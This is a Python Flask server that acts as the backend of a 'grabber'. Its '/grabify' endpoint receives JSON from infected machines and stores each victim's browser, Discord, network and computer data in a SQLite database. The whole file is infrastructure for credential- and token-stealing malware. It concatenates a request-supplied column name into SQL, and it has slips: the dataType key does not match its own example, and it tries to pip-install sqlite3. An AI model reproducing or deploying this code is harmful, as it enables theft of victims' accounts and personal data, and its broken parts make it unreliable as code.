import json
import pip
import os

try:
    from flask import Flask, request, abort
except:
    pip.main(['install', 'flask'])
    from flask import Flask, request, abort

try:
    import sqlite3
except:
    pip.main(['install', 'sqlite3'])
    import sqlite3

app = Flask(__name__)


@app.route("/grabify", methods=["POST"])
def webhook():
    if request.method == "POST":
        data = request.json

        dataType = data["type"]  # information, complete
        # Example requests:
        # {"type": "information", "data_type": "browser" "user": "LUKAS", "data": {"ip": "helloworld", "cpu": "yessir"}}

        if (dataType == "information"):
            user = data["user"]  # LUKAS
            # {"ip": "helloworld", "cpu": "yessir"}
            data_information = data["data"]

            try:
                add_to_db(user, data_information, data["dataType"] + "_data")
                return "OK"
            except Exception as e:
                print(e)
                abort(404)

        elif dataType == "complete":
            print("GRABBER :: " + data["user"] + " :: COMPLETE")
            return "OK"

        return "OK"
    else:
        abort(404)


def generate_db():
    conn = sqlite3.connect("grabber.db")
    c = conn.cursor()

    c.execute("""CREATE TABLE grabber (
        user text,
        browser_data text,
        discord_data text,
        network_data text,
        computer_data text
    )""")

    conn.commit()
    conn.close()


def add_to_db(user, data, type):
    if not os.path.exists("grabber.db"):
        generate_db()

    conn = sqlite3.connect("grabber.db")
    c = conn.cursor()

    # Check if the user exists, then just add it to the table or if that column as well exists, then just replace the column thingy.
    if c.execute("SELECT * FROM grabber WHERE user=?", (user,)).fetchone() is not None:
        c.execute("UPDATE grabber SET " + type +
                  "=? WHERE user=?", (data, user))

    else:
        c.execute("INSERT INTO grabber (user, " +
                  type + ") VALUES (?, ?)", (user, data))

    conn.commit()
    conn.close()


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
